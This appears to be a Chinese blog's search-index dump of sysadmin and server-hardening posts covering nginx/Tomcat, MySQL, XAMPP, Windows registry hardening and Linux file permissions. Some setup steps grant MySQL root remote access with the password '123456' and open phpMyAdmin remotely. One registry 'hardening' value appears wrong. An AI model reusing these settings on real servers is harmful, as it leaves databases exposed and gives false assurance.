http://nginx.org/download/nginx-1.25.1.tar.gztar -zxvf nginx-1.25.1.tar.gz cd nginx-1.25.1/yum -y install gcc pcre-devel zlib-devel openssl openssl-devel./configure --prefix=/usr/local/nginx --with-http_ssl_modulemakemake install[root@192 nginx-1.25.1]# whereis nginxnginx: /usr/local/nginx/usr/local/nginx/sbin/nginx 4、nginx 连接Tomcat (单节点配置) 正常站点还要添加另一个location 1234location /website/&#123; proxy_pass http:mytomcat/website/; proxy_redirect default;&#125; 此时访问 http://192.168.101.10:80（nginx） 即为访问http://192.168.101.10:8080（Tomcat） 多节点新增Server即可。增加ip_hash ;保证同一个IP只分配同一个节点。 123456upstream mytomcat&#123; ip_hash ; # 指定Tomcat的服务器IP地址 端口以及权重 server 192.168.101.10:8080 weight=1; server 192.168.101.11:8080 weight=1; &#125;","categories":[{"name":"web渗透","slug":"web渗透","permalink":"http://zwjsfdbb.top/categories/web%E6%B8%97%E9%80%8F/"}],"tags":[{"name":"web渗透","slug":"web渗透","permalink":"http://zwjsfdbb.top/tags/web%E6%B8%97%E9%80%8F/"}]},{"title":"Java_Tomcat环境","slug":"Web渗透/Java_Tomcat环境_new","date":"2023-06-26T16:00:00.000Z","updated":"2024-03-12T10:13:40.733Z","comments":true,"path":"2023/06/27/Web渗透/Java_Tomcat环境_new/","link":"","permalink":"http://zwjsfdbb.top/2023/06/27/Web%E6%B8%97%E9%80%8F/Java_Tomcat%E7%8E%AF%E5%A2%83_new/","excerpt":"Java_Tomcat环境Tomcat 核心功能是作为Java的容器来运行Java的后台代码，并内置对HTTP请求的处理，但不是最优选择，前面往往加一个Apache或者Nigix 处理HTTP请求。 1、 单独安装Mysql5.6环境 123456789101112131415161718192021222324wget http://repo.mysql.com/mysql-community-release-el6-5.noarch.rpmyum list installed | grep mysqlrpm -qa|grep -i mariadbrpm -qa|grep mariadb|xargs rpm -e --nodepsrpm -qa|grep -i mariadbrpm -ivh mysql-community-release-el6-5.noarch.rpmyum repolist all | grep mysqlyum install mysql-community-serversystemctl status mysqldsystemctl start mysqldsystemctl status mysqldmysql -uroot use mysql; UPDATE user SET Password=PASSWORD(&#x27;123456&#x27;) WHERE User=&#x27;root&#x27;; GRANT ALL PRIVILEGES ON *.* TO &#x27;root&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;123456&#x27; WITH GRANT OPTION; FLUSH privileges;systectl restart mysqld# 如果不小心改错了,以不验证模式启动Mysqlsystemctl stop mysqldmysqld_safe --skip-grant-tables 随后登录，更改 2 .安装Tomcat 8.5 (java 已安装) 下载链接 https://tomcat.apache.org/download-80.cgi 12345678910111213141516171819tar xzvf apache-tomcat-8.5.90.tar.gzmv apache-tomcat-8.5.90 /optecho &#x27;export CATALINA_HOME=/opt/apache-tomcat-8.5.90&#x27; &gt;&gt; ~/.bashrcecho &#x27;export PATH=$CATALINA_HOME/bin:$PATH&#x27; &gt;&gt; ~/.bashrcsource ~/.bashrc# 防火墙firewall-cmd --add-port=8080/tcp --permanent# 启动$CATALINA_HOME/bin/startup.sh# 默认配置文件/opt/apache-tomcat-8.5.90/conf/server.xml#默认日志文件/opt/apache-tomcat-8.5.90/log/catalina.out#访问日志文件/opt/apache-tomcat-8.5.90/log/localhost_access_log.2023-06-27.txt 默认网站根目录如下 数据库连接文件","text":"Java_Tomcat环境Tomcat 核心功能是作为Java的容器来运行Java的后台代码，并内置对HTTP请求的处理，但不是最优选择，前面往往加一个Apache或者Nigix 处理HTTP请求。 1、 单独安装Mysql5.6环境 123456789101112131415161718192021222324wget http://repo.mysql.com/mysql-community-release-el6-5.noarch.rpmyum list installed | grep mysqlrpm -qa|grep -i mariadbrpm -qa|grep mariadb|xargs rpm -e --nodepsrpm -qa|grep -i mariadbrpm -ivh mysql-community-release-el6-5.noarch.rpmyum repolist all | grep mysqlyum install mysql-community-serversystemctl status mysqldsystemctl start mysqldsystemctl status mysqldmysql -uroot use mysql; UPDATE user SET Password=PASSWORD(&#x27;123456&#x27;) WHERE User=&#x27;root&#x27;; GRANT ALL PRIVILEGES ON *.* TO &#x27;root&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;123456&#x27; WITH GRANT OPTION; FLUSH privileges;systectl restart mysqld# 如果不小心改错了,以不验证模式启动Mysqlsystemctl stop mysqldmysqld_safe --skip-grant-tables 随后登录，更改 2 .安装Tomcat 8.5 (java 已安装) 下载链接 https://tomcat.apache.org/download-80.cgi 12345678910111213141516171819tar xzvf apache-tomcat-8.5.90.tar.gzmv apache-tomcat-8.5.90 /optecho &#x27;export CATALINA_HOME=/opt/apache-tomcat-8.5.90&#x27; &gt;&gt; ~/.bashrcecho &#x27;export PATH=$CATALINA_HOME/bin:$PATH&#x27; &gt;&gt; ~/.bashrcsource ~/.bashrc# 防火墙firewall-cmd --add-port=8080/tcp --permanent# 启动$CATALINA_HOME/bin/startup.sh# 默认配置文件/opt/apache-tomcat-8.5.90/conf/server.xml#默认日志文件/opt/apache-tomcat-8.5.90/log/catalina.out#访问日志文件/opt/apache-tomcat-8.5.90/log/localhost_access_log.2023-06-27.txt 默认网站根目录如下 数据库连接文件 修改对应的网站的数据库连接情况，导入数据库， 3、配置HTTPS 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849[root@192 apache-tomcat-8.5.90]# keytool -genkeypair -alias &quot;tomcat&quot; -keyalg &quot;RSA&quot; -keystore &quot;/opt/tomcat.keystore&quot;Enter keystore password: Re-enter new password: What is your first and last name? [Unknown]: jieWhat is the name of your organizational unit? [Unknown]: 360What is the name of your organization? [Unknown]: 360What is the name of your City or Locality? [Unknown]: chengduWhat is the name of your State or Province? [Unknown]: sichuanWhat is the two-letter country code for this unit? [Unknown]: cnIs CN=jie, OU=360, O=360, L=chengdu, ST=sichuan, C=cn correct? [no]: yesEnter key password for &lt;tomcat&gt; (RETURN if same as keystore password): Re-enter new password: Warning:The JKS keystore uses a proprietary format. It is recommended to migrate to PKCS12 which is an industry standard format using &quot;keytool -importkeystore -srckeystore /opt/tomcat.keystore -destkeystore /opt/tomcat.keystore -deststoretype pkcs12&quot;.[root@192 apache-tomcat-8.5.90]# keytool -importkeystore -srckeystore /opt/tomcat.keystore -destkeystore /opt/tomcat.keystore -deststoretype pkcs12&quot;&gt; ^C[root@192 apache-tomcat-8.5.90]# keytool -importkeystore -srckeystore /opt/tomcat.keystore -destkeystore /opt/tomcat.keystore -deststoretype pkcs12Enter source keystore password: Entry for alias tomcat successfully imported.Import command completed: 1 entries successfully imported, 0 entries failed or cancelledWarning:Migrated &quot;/opt/tomcat.keystore&quot; to Non JKS/JCEKS. The JKS keystore is backed up as &quot;/opt/tomcat.keystore.old&quot;.接着更改配置文件conf/server.xml &lt;Connector port=&quot;8443&quot; protocol=&quot;org.apache.coyote.http11.Http11NioProtocol&quot; maxThreads=&quot;150&quot; SSLEnabled=&quot;true&quot; maxParameterCount=&quot;1000&quot; keystoreFile=&quot;/opt/tomcat.keystore&quot; keystorePass=&quot;123456&quot; &gt; &lt;SSLHostConfig&gt; &lt;Certificate certificateKeystoreFile=&quot;conf/localhost-rsa.jks&quot; type=&quot;RSA&quot; /&gt; &lt;/SSLHostConfig&gt; &lt;/Connector&gt;","categories":[{"name":"web渗透","slug":"web渗透","permalink":"http://zwjsfdbb.top/categories/web%E6%B8%97%E9%80%8F/"}],"tags":[{"name":"web渗透","slug":"web渗透","permalink":"http://zwjsfdbb.top/tags/web%E6%B8%97%E9%80%8F/"}]},{"title":"ubuntu 工程迁移到centos","slug":"系统基础/ubuntu 工程迁移到centos","date":"2023-06-26T16:00:00.000Z","updated":"2024-03-12T15:46:57.498Z","comments":true,"path":"2023/06/27/系统基础/ubuntu 工程迁移到centos/","link":"","permalink":"http://zwjsfdbb.top/2023/06/27/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/ubuntu%20%E5%B7%A5%E7%A8%8B%E8%BF%81%E7%A7%BB%E5%88%B0centos/","excerpt":"Ubuntu上的环境迁移到Centos遇到的坑 1、运行截图如下： 2、后来发现环境是64位的，而实际运行环境是需要32位的python，重新下载编译 12345678910111213# 下载链接 https://www.python.org/ftp/python/2.7.18/Python-2.7.18.tar.xzyum install glibc.i686 libgcc.i686 libstdc++.i686 zlib-devel.i686 ncurses-devel.i686 readline-devel.i686wget https://www.python.org/ftp/python/2.7.18/Python-2.7.18.tar.xztar -xvf Python-2.7.18.tar.xz cd Python-2.7.18yum install -y gcc make libc-devyum install zlib-devel libffi-devel openssl-devel./configure --prefix=/usr/local/python32 make &amp;&amp; make installexport PATH=/usr/local/python32/bin:$PATH","text":"Ubuntu上的环境迁移到Centos遇到的坑 1、运行截图如下： 2、后来发现环境是64位的，而实际运行环境是需要32位的python，重新下载编译 12345678910111213# 下载链接 https://www.python.org/ftp/python/2.7.18/Python-2.7.18.tar.xzyum install glibc.i686 libgcc.i686 libstdc++.i686 zlib-devel.i686 ncurses-devel.i686 readline-devel.i686wget https://www.python.org/ftp/python/2.7.18/Python-2.7.18.tar.xztar -xvf Python-2.7.18.tar.xz cd Python-2.7.18yum install -y gcc make libc-devyum install zlib-devel libffi-devel openssl-devel./configure --prefix=/usr/local/python32 make &amp;&amp; make installexport PATH=/usr/local/python32/bin:$PATH","categories":[{"name":"系统基础","slug":"系统基础","permalink":"http://zwjsfdbb.top/categories/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"系统基础","slug":"系统基础","permalink":"http://zwjsfdbb.top/tags/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/"}]},{"title":"LAMP环境","slug":"Web渗透/LAMP环境_new","date":"2023-06-23T16:00:00.000Z","updated":"2024-03-12T10:13:46.830Z","comments":true,"path":"2023/06/24/Web渗透/LAMP环境_new/","link":"","permalink":"http://zwjsfdbb.top/2023/06/24/Web%E6%B8%97%E9%80%8F/LAMP%E7%8E%AF%E5%A2%83_new/","excerpt":"Lampp环境1、基本概念与环境 Linux+apache2+mysql+php+python Xmapp 是集合了LAMPP 的完整的运行环境，相对来说适用于开发和调试，但是安全性配置不足，相对而言漏洞较多。 Xmapp 启动后，Apache 使用端口80，防火墙要放行 1firewall-cmd --add-port=80/tcp --permanent http://ip/dashboard/phpinfo.php 展示了所有运行环境参数，通常情况下，配置完成后要删除该页面 默认情况下，&#x2F;opt&#x2F;lampp&#x2F;htdocs 目录是应用程序的根目录。 phpmyadmin 是mysql的网页端，默认情况下禁止远程访问 123456789# 修改/opt/lampp/etc/extra/httpd-xampp.conf # 注释 Require local 新增 Require all granted 即可运行远程访问# since XAMPP 1.4.3&lt;Directory &quot;/opt/lampp/phpmyadmin&quot;&gt; AllowOverride AuthConfig Limit # Require local Require all granted ErrorDocument 403 /error/XAMPP_FORBIDDEN.html.var&lt;/Directory&gt; 确认服务和端口正常启动 修改默认端口，修改配置文件&#x2F;opt&#x2F;lampp&#x2F;etc&#x2F;httpd.conf，改成非80，更安全 如果出现内核版本不兼容情况，修改&#x2F;opt&#x2F;lampp&#x2F;lampp ，将内核版本修改为2.8.0以上。 1LD_ASSUME_KERNEL=2.8.0 部署对应的系统或者网站，导入数据库，修改配置文件等。 注意配置数据库时 修改root默认密码 配置phpmyadmin 允许远程访问，或者设置一个可以远程访问的用户，然后用navicat连接进行配置 123456789101112131415161718默认数据库的user情况MariaDB [mysql]&gt; select User,Password,Host from user;+------+----------+-----------+| User | Password | Host |+------+----------+-----------+| root | | localhost || root | | 127.0.0.1 || root | | ::1 || | | localhost || root | | % || pma | | localhost第一行：用户名为 root，密码为空白，允许从 localhost 发起连接请求，不需要密码。第二行：用户名为 root，密码为空白，允许从 127.0.0.1 发起连接请求，不需要密码。第三行：用户名为 root，密码为空白，允许从 ::1 发起连接请求，不需要密码。第四行：用户名为空白，密码为空白，允许从 localhost 发起连接请求。这行数据有些特殊，因为它可以允许任何人以匿名身份登录，不需要密码。第五行：用户名为 root，密码为空白，允许从任意主机（%）发起连接请求。注意，在使用通配符 % 时需要小心，因为这样很可能导致安全漏洞，不需要密码。第六行：用户名为 pma，密码为空白，允许从 localhost 发起连接请求。pma 是 phpMyAdmin 中默认创建的一个用户，用于管理 MySQL 数据库，不需要密码。 两种方式修改mysql的密码： 第一种方式： phpmyadmin 点击修改权限，找到change password, 添加密码，然后修改phpmyadmin&#x2F;config.inc.php 1$cfg[&#x27;Servers&#x27;][$i][&#x27;password&#x27;] = &#x27;654321&#x27;; 第二种方式，默认空密码登陆后 12345678mysql -uroot update user set authentication_string=password(&#x27;qwe123&#x27;) where user=&#x27;root&#x27; and host=&#x27;localhost&#x27;;update user set authentication_string=password(&#x27;qwe123&#x27;) where user=&#x27;root&#x27; and host=&#x27;127.0.0.1&#x27;;update user set authentication_string=password(&#x27;xxxxxx&#x27;) where user=&#x27;root&#x27; and host=&#x27;%&#x27;;flush privileges# 注意 authentication_string 在低版本是password ，在高版本是 authentication_string而不是下面的语句update user set password=&#x27;qwe123&#x27; where user=&#x27;root&#x27; and host=&#x27;localhost&#x27;; 注意如果密码出错，无法登录进去的话，可以修改my.cnf 加入 1skip-grant-tables 安全起见，一般要禁用phpmyadmin，有三种方法","text":"Lampp环境1、基本概念与环境 Linux+apache2+mysql+php+python Xmapp 是集合了LAMPP 的完整的运行环境，相对来说适用于开发和调试，但是安全性配置不足，相对而言漏洞较多。 Xmapp 启动后，Apache 使用端口80，防火墙要放行 1firewall-cmd --add-port=80/tcp --permanent http://ip/dashboard/phpinfo.php 展示了所有运行环境参数，通常情况下，配置完成后要删除该页面 默认情况下，&#x2F;opt&#x2F;lampp&#x2F;htdocs 目录是应用程序的根目录。 phpmyadmin 是mysql的网页端，默认情况下禁止远程访问 123456789# 修改/opt/lampp/etc/extra/httpd-xampp.conf # 注释 Require local 新增 Require all granted 即可运行远程访问# since XAMPP 1.4.3&lt;Directory &quot;/opt/lampp/phpmyadmin&quot;&gt; AllowOverride AuthConfig Limit # Require local Require all granted ErrorDocument 403 /error/XAMPP_FORBIDDEN.html.var&lt;/Directory&gt; 确认服务和端口正常启动 修改默认端口，修改配置文件&#x2F;opt&#x2F;lampp&#x2F;etc&#x2F;httpd.conf，改成非80，更安全 如果出现内核版本不兼容情况，修改&#x2F;opt&#x2F;lampp&#x2F;lampp ，将内核版本修改为2.8.0以上。 1LD_ASSUME_KERNEL=2.8.0 部署对应的系统或者网站，导入数据库，修改配置文件等。 注意配置数据库时 修改root默认密码 配置phpmyadmin 允许远程访问，或者设置一个可以远程访问的用户，然后用navicat连接进行配置 123456789101112131415161718默认数据库的user情况MariaDB [mysql]&gt; select User,Password,Host from user;+------+----------+-----------+| User | Password | Host |+------+----------+-----------+| root | | localhost || root | | 127.0.0.1 || root | | ::1 || | | localhost || root | | % || pma | | localhost第一行：用户名为 root，密码为空白，允许从 localhost 发起连接请求，不需要密码。第二行：用户名为 root，密码为空白，允许从 127.0.0.1 发起连接请求，不需要密码。第三行：用户名为 root，密码为空白，允许从 ::1 发起连接请求，不需要密码。第四行：用户名为空白，密码为空白，允许从 localhost 发起连接请求。这行数据有些特殊，因为它可以允许任何人以匿名身份登录，不需要密码。第五行：用户名为 root，密码为空白，允许从任意主机（%）发起连接请求。注意，在使用通配符 % 时需要小心，因为这样很可能导致安全漏洞，不需要密码。第六行：用户名为 pma，密码为空白，允许从 localhost 发起连接请求。pma 是 phpMyAdmin 中默认创建的一个用户，用于管理 MySQL 数据库，不需要密码。 两种方式修改mysql的密码： 第一种方式： phpmyadmin 点击修改权限，找到change password, 添加密码，然后修改phpmyadmin&#x2F;config.inc.php 1$cfg[&#x27;Servers&#x27;][$i][&#x27;password&#x27;] = &#x27;654321&#x27;; 第二种方式，默认空密码登陆后 12345678mysql -uroot update user set authentication_string=password(&#x27;qwe123&#x27;) where user=&#x27;root&#x27; and host=&#x27;localhost&#x27;;update user set authentication_string=password(&#x27;qwe123&#x27;) where user=&#x27;root&#x27; and host=&#x27;127.0.0.1&#x27;;update user set authentication_string=password(&#x27;xxxxxx&#x27;) where user=&#x27;root&#x27; and host=&#x27;%&#x27;;flush privileges# 注意 authentication_string 在低版本是password ，在高版本是 authentication_string而不是下面的语句update user set password=&#x27;qwe123&#x27; where user=&#x27;root&#x27; and host=&#x27;localhost&#x27;; 注意如果密码出错，无法登录进去的话，可以修改my.cnf 加入 1skip-grant-tables 安全起见，一般要禁用phpmyadmin，有三种方法 1、设置访问密码，更改PhpMyadmin的默认config 模式为cookie模式 123使用cookie授权模式 将&#x27;auth_type&#x27;改为&#x27;cookie&#x27;，然后修改&#x27;blowfish_secret&#x27;用一个任意字符串作为cookie的加密字符串，如果没有加密钥匙,系统会显示&quot;配置文件现在需要绝密的短语密码(blowfish_secret) &quot; ,配置文件如下:$cfg[&#x27;Servers&#x27;][$i][&#x27;auth_type&#x27;] = &#x27;cookie&#x27;; $cfg[&#x27;blowfish_secret&#x27;] = &#x27;44e2f5aece2855.93921574&#x27;; 2、禁用phpMyadmin，在httpd.conf 注释掉http-xmapp.conf的包含目录，删除phpmyadmin 3、管理数据库，使用数据库，phpmyadmin 放在另一个服务器上之类的 4、使用knock 进行端口隐藏，使用时再打开 其他注意事项 1、任何一个URL地址，一定要指定到具体的文件，如果没有指定，访问默认首页 如 httpd.conf 1DirectoryIndex index.html index.html.var index.php index.php3 index.php4 默认下，任何一个目录，如果只输入目录名而不输入文件名去访问，该目录必须要有一个默认主文件，比如index.html。index.php ，index.jsp default.php main.php 否则将无法访问到该页面，不然就是明显的安全漏洞，如目录浏览 2、为了防止目录浏览，还可以修改httpd.conf ，修改options 12Options Indexes FollowSymLinks ExecCGI Includes改成Options None","categories":[{"name":"web渗透","slug":"web渗透","permalink":"http://zwjsfdbb.top/categories/web%E6%B8%97%E9%80%8F/"}],"tags":[{"name":"web渗透","slug":"web渗透","permalink":"http://zwjsfdbb.top/tags/web%E6%B8%97%E9%80%8F/"}]},{"title":"windows 服务器加固技术","slug":"系统基础/windows 服务器加固技术_new","date":"2023-06-10T16:00:00.000Z","updated":"2024-03-12T09:54:00.420Z","comments":true,"path":"2023/06/11/系统基础/windows 服务器加固技术_new/","link":"","permalink":"http://zwjsfdbb.top/2023/06/11/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/windows%20%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8A%A0%E5%9B%BA%E6%8A%80%E6%9C%AF_new/","excerpt":"Windows 服务器加固技术1、windows 常用命令 命令 说明 ver 查看系统版本 hostname 查看主机名 ipconfig &#x2F;all 查看网络配置 net user&#x2F;localgroup&#x2F;share&#x2F;config 查看用户&#x2F;用户组&#x2F;共享&#x2F;当前运行可配置服务 at 建立或查看系统作业 netstat 查看开放端口 secpol.msc 查看和修改本地安全设置 services.msc 查看和修改服务 eventvwr.msc 查看日志 regedit 打开注册表 whoami 查看当前操作用户的用户名 修改本地安全策略 账户策略 密码策略 账户锁定策略 本地策略 审核策略 -记录成日志 用户权限分配 安全选项 2、windows 常见端口 端口 说明 80&#x2F;8080&#x2F;8081 HTTP协议代理服务器常用端口号 443 HTTPS协议代理服务器常用端口号 21 FTP(文件传输协议)协议代理服务器常用端口号 23 Telnet(远程登录)协议代理服务器常用端口号 22 SSH（安全登录）、SCP（文件传输） 1521 Oracle 数据库 1433 MS SQL SERVER数据库 1080 QQ 3306 Mysql数据库 25 SMTP（简单邮件传输协议） 3、windows账号及安全策略 windows+R secpol.msc 账号策略 1234密码必须符合复杂性要求：启用 密码长度最小值 8个字符 密码最长使用期限： 30天 强制密码历史： 3个记住的密码","text":"Windows 服务器加固技术1、windows 常用命令 命令 说明 ver 查看系统版本 hostname 查看主机名 ipconfig &#x2F;all 查看网络配置 net user&#x2F;localgroup&#x2F;share&#x2F;config 查看用户&#x2F;用户组&#x2F;共享&#x2F;当前运行可配置服务 at 建立或查看系统作业 netstat 查看开放端口 secpol.msc 查看和修改本地安全设置 services.msc 查看和修改服务 eventvwr.msc 查看日志 regedit 打开注册表 whoami 查看当前操作用户的用户名 修改本地安全策略 账户策略 密码策略 账户锁定策略 本地策略 审核策略 -记录成日志 用户权限分配 安全选项 2、windows 常见端口 端口 说明 80&#x2F;8080&#x2F;8081 HTTP协议代理服务器常用端口号 443 HTTPS协议代理服务器常用端口号 21 FTP(文件传输协议)协议代理服务器常用端口号 23 Telnet(远程登录)协议代理服务器常用端口号 22 SSH（安全登录）、SCP（文件传输） 1521 Oracle 数据库 1433 MS SQL SERVER数据库 1080 QQ 3306 Mysql数据库 25 SMTP（简单邮件传输协议） 3、windows账号及安全策略 windows+R secpol.msc 账号策略 1234密码必须符合复杂性要求：启用 密码长度最小值 8个字符 密码最长使用期限： 30天 强制密码历史： 3个记住的密码 账号锁定 123帐户锁定阀值： 3次无效登陆帐户锁定时间： 30分钟 复位帐户锁定计数器：30分钟之后 Administrator账号 组重命名 Win + R 键，然后输入 compmgmt.msc 命令打开计算机管理 1wmic useraccount where name=&#x27;Administor&#x27; call Rename admin 禁用Guest账户 4、日志以及审核策略 windows+R secpol.msc 本地策略-&gt;审核策略 12345678审核策略更改 成功，失败 审核登陆事件 成功，失败审核对象访问 失败 审核目录服务访问 失败 审核特权使用 失败 审核系统事件 成功，失败 审核账户登陆事件 成功，失败 审核帐户管理 成功，失败 更改日志大小 eventvwr.msc 1234日志类型 日志大小 覆盖策略应用程序 80000KB 覆盖早于30天的日志安全日志 80000KB 覆盖早于30天的日志系统日志 80000KB 覆盖早于30天的日志 5、安全选项本地安全策略-&gt;本地策略-&gt;安全选项 Microsoft 网络服务器：当登录时间用完时自动注销用户（启用） 目的：可以避免用户在不适合的时间登录到系统,或者用户登录到系统后忘记退出登录 Microsoft 网络服务器：在挂起会话之前所需的空闲时间（小于等于30分钟） 目的：设置挂起会话之前所需的空闲时间为30分钟 Microsoft 网络客户端：发送未加密的密码到第三方SMB服务器（禁用） 目的：禁止发送未加密的密码到第三方SMB服务器 故障恢复控制台:允许对所有驱动器和文件夹进行软盘复制和访问（禁用） 目的：禁止它访问硬盘驱动器上的所有文件和目录。它仅允许访问每个卷的根目录%systemroot%目录及子目录，即使是这样它还限制不允许把硬盘驱动器上的文件拷贝到软盘上 故障恢复控 制台:允许自动系统管理级登录（禁用） 目的：恢复控制台是Windows 2003的一个新特性，它在一个不能启动的系统上给出一个受限的命令行访问界面。可能会导致任何可以重起系统的人绕过账号口令限制和其它安全设置而访问系统 关机：清除虚拟内存页面文件（启用） 目的：某些第三方的程序可能把一些没有的加密的密码存在内存中，页面文件中也可能含有另外一些敏感的资料。关机的时候清除页面文件，防止造成意外的信息泄漏 关机：允许系统在未登录前关机（禁用） 目的：在未登录前不能关闭计算机 交互式登录：不显示上次的用户名（启用） 目的：登陆时不显示上次的用户名，防止暴露用户名。 交互式登录：不需要按Ctrl+Alt+Del（禁用） 目的：登录时需要按CTRL+ALT+DEL 交互式登录：可被缓存的前次登录个数（设置缓存数为0，此项对域服务器无效。） 目的：登陆时不显示上次的用户名，防止暴露用户名 网络访问：不允许为网络身份验证储存凭证或 .NET passports(启用） 审核：如果无法记录安全审核则立即关闭系统 （启用） 审核：对全局系统对象的访问进行审核（启用） 网络访问：本地账户的共享和安全模式：仅来宾–本地账户以来宾用户身份验证 网络访问：可匿名访问的共享（全部删除） 网络访问：可匿名访问的命名管道 （全部删除） 网络访问：可远程访问的注册表路径（全部删除） 网络访问：可远程访问的注册表路径和子路径 （全部删除） 用户权限策略设置 通过终端服务拒绝登陆”中加入Guests、User组 “通过终端服务允许登陆”中只加入Administrators组 “从网络访问此计算机”中删除PowerUsers和BackupOperators “拒绝本地登录”中添加web和guest用户 6、NTFS安全Windows权限的继承性、累加性、优先性、交叉性四项基本原则 Windows NT以后的文件，及文件夹共享设置有以下特性：继承性、累加性、优先性、交叉性。 继承性：下级的目录在没有经过重新设置之前，是拥有上一级目录权限设置的。 累加性：是说如一个组GROUP1中有两个用户USER1、USER2，他们同时对某文件或目录的访问权限分别为“读取”和“写入”，那么组GROUP1对该文件或目录的访问权限就为USER1和USER2的访问权限之和。 优先性：权限的这一特性又包含两种子特性，其一是文件的访问权限优先目录的权限，也就是说文件权限可以越过目录的权限，不顾上一级文件夹的设置。另一特性就是“拒绝”权限优先其它权限，也就是说“拒绝”权限可以越过其它所有其它权限，一旦选择了“拒绝”权限，则其它权限也就不能取任何作用，相当于没有设置。 交叉性：指当同一文件夹在为某一用户设置了共享权限的同时又为用户设置了该文件夹的访问权限，且所设权限不一致时，它的取舍原则是取两个权限的交集，也即最严格、最小的那种权限。如目录A为用户USER1设置的共享权限为“只读”，同时目录A为用户USER1设置的访问权限为“完全控制”，那用户USER1的最终访问权限为“只读”。 12345678系统分区C盘 administrator、system完全控制C:\\Documents and Settings\\ administrator、system完全控制C:\\windows\\system32\\ administrator读写C:\\progran files 为Common File目录之外的所有目录赋予Administrators 和SYSTEM 完全控制C:\\windows 系统管理员完全控制、system拒绝(继承)C:\\windows\\system32 其关键程序只允许administrator完全控制C:\\Inetpub\\ administrator、system完全控制，必要时可以删除该目录网站目录所在磁盘 administrator、system完全控制 7、注册表安全设置12345HKEY_LOCAL_MACHINE 包含关于本地计算机系统的信息，包括硬件和操作系统数据。HKEY_LOCAL_ROOT 包含各种OLE技术使用的信息技术和文件类别关联数据HKEY_LOCAL_USER 包含环境变量、桌面设置、网络连接、打印机和程序首选项。HKEY_LOCAL_USERS 包含关于动态加载的用户配置文件和默认的配置文件的信息，有些信息和HKEY_CURRENT_USER交叉出现HKEY_CURRENT_CONFIG 包含在启动时由本地计算机系统使用的硬件配置文件的相关信息。 禁止自动登录 12reg add &quot;HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon&quot; /v AutoAdminLogon /d 0 /f 启用源路由欺骗保护 1reg add &quot; System\\CurrentControlSet\\ Services\\Tcpip\\Parameters\\ &quot; /v DisableIPSourceRouting /t REG_DWORD /d 2 /f 禁止空链接 12reg add &quot;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa&quot; /v restrictanonymous /d 0 /f 删除系统默认共享 123456#查看默认共享net share#删除默认共享net share &lt;共享名&gt; /del# 默认共享 在其他主机输入IP，用户名和密码可访问共享 修改默认3389远程端口 12reg add &quot;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Wds\\rdpwd\\Tds\\tcp&quot; /v PortNumber /d 4445 /f 关闭135.139.445隐患端口 12345防火墙-&gt;新建规则-&gt;端口-&gt;阻止连接135 RPC服务139 局域网文件和打印机共享协议445 SMB协议的文件共享","categories":[{"name":"系统基础","slug":"系统基础","permalink":"http://zwjsfdbb.top/categories/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"系统基础","slug":"系统基础","permalink":"http://zwjsfdbb.top/tags/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/"}]},{"title":"Linux系统安全配置","slug":"系统基础/Linux系统安全配置","date":"2023-06-03T16:00:00.000Z","updated":"2024-03-12T09:53:48.685Z","comments":true,"path":"2023/06/04/系统基础/Linux系统安全配置/","link":"","permalink":"http://zwjsfdbb.top/2023/06/04/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/Linux%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE/","excerpt":"Linux系统安全配置系统权限1、安装操作系统1、选择稳定版操作系统 2、最小化安装（后期方便安装应用） 3、不要安装gcc ，make（防止黑客进入以后方便操作） 4、安装系统后更新系统 1yum -y update 2、文件权限 文件夹默认权限 755 777-022 文件默认权限 644 666-022","text":"Linux系统安全配置系统权限1、安装操作系统1、选择稳定版操作系统 2、最小化安装（后期方便安装应用） 3、不要安装gcc ，make（防止黑客进入以后方便操作） 4、安装系统后更新系统 1yum -y update 2、文件权限 文件夹默认权限 755 777-022 文件默认权限 644 666-022 ​ &#x2F;root 550 ​ &#x2F;etc&#x2F;passwd 644 ​ &#x2F;etc&#x2F;shadow 000 冒险位是什么 当一个二进制可执行文件被分配了 SUID 标志位后，该程序就可以以该文件所有者的身份来运行，即使它被其他用户执行。通常情况下，只有一些特定的二进制可执行文件需要使用 setuid 来工作。 本身普通用户jack 不用 less &#x2F;etc&#x2F;shadow 查看 给less加了冒险位以后，less 以该文件所有者的身份运行，从而可以查看&#x2F;etc&#x2F;shadow。 sgid强制位是什么 对目录生效，在此目录创建文件自动归入目录所在组 1chmod 2777 dirname 如下图所示，xxx目录被设置了强制位，那么即便root用户在该目录创建了一个文件，但是其所属组仍然是jack sticky粘制位是什么 目录中的文件只能被文件拥有者删除 1chmod 1777 dirname 文件ACL getfack setfacl 设置了acl的有+ 1234567# 设置acl权限setfacl -m -u:usename:权限 filename # 查看acl权限getfacl filename# 删除acl权限setfacl -x -u:usename filenamesetfacl -b filename 文件属性chattr lsattr1234567891011121314151617181920212223242526272829chattr +a filename 文件只能追加不能删除lsattr filename 查看文件属性chattr -a filename 减去追加权限chattr +i filename 不允许改变也不运行删除示例 让黑客不能添加用户，可以通过修改passwd文件来chattr +i /etc/passwd 不允许修改，也不允许删除，然后隐藏chattr命令，mv +rename 示例 2 find /bin /sbin /usr/bin /usr/sbin /etc/passwd /etc/shadow /etc/pam.d -type -f -exec chattr +i &#123;&#125; \\;示例3 日志文件防止删除chattr +a /var/log/messages /var/log/secure如果有日志轮转的话vim /etc/logrotate.d/syslogprerotate chattr -a /var/log/messagesendscript......prerotate chattr +a /var/log/messagesendscript 3、用户授权 su 123# 切换到用户jack 并同时切到用户目录su - jack # 而不是su jack（在当前目录切换） sudo 1234567891011121314# 修改用户visudo = vim /etc/sudoers修改语法如下：jack ALL=NOPASSWD: 